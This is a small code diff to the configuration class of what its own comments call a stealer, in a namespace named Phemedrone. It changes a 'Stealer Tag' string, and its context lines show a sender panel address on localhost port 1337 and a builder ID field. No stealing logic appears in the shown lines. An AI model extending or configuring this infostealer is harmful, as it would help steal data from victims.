@@ -13,7 +13,7 @@ namespace Phemedrone
         public static ISender SenderService = new Panel("127.0.0.1:1337");
         
         // Stealer Tag
-        public static string Tag = "SomeTag1";
+        public static string Tag = "SomeTag";
 
         // used for builder, leave it blank
         public static string BuildID = "";
